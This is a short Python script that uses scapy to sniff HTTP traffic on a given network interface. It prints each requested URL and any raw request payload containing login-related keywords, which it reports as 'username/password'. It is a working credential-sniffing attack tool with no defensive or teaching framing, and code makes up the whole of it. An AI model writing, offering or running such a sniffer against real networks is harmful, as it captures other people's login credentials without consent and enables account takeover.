import scapy.all as scapy
from scapy.layers import http
import argparse
import os

if os.geteuid() != 0:
    exit("you must be as root user to run this tool, buddy!!!")

def get_arguments():
    parser = argparse.ArgumentParser()
    parser.add_argument("-i", "--interface", dest="interface", help="specify your interface")
    options = parser.parse_args()

    if not options.interface:
        parser.error("specif your interface")
    else:
        return options


def sniff(interface):
    scapy.sniff(iface=interface, store=False, prn=print_sniffed_packet)


def get_url(packet):
    return packet[http.HTTPRequest].Host + packet[http.HTTPRequest].Path


def user_info(packet):
    if packet.haslayer(scapy.Raw):
        load = str(packet[scapy.Raw].load)
        keywords = ["email", "username", "UserName", "User Name", "User", "user", "ID", "id", "login", "login id",
                    "Login", "Login Id", "pasword"]
        for keyword in keywords:
            if keyword in load:
                return load


def print_sniffed_packet(packet):
    if packet.haslayer(http.HTTPRequest):
        url = get_url(packet)
        print("url >> " + url.decode())

        password = user_info(packet)
        if password:
            print("username/password >> " + password)


options = get_arguments()
sniff(options.interface)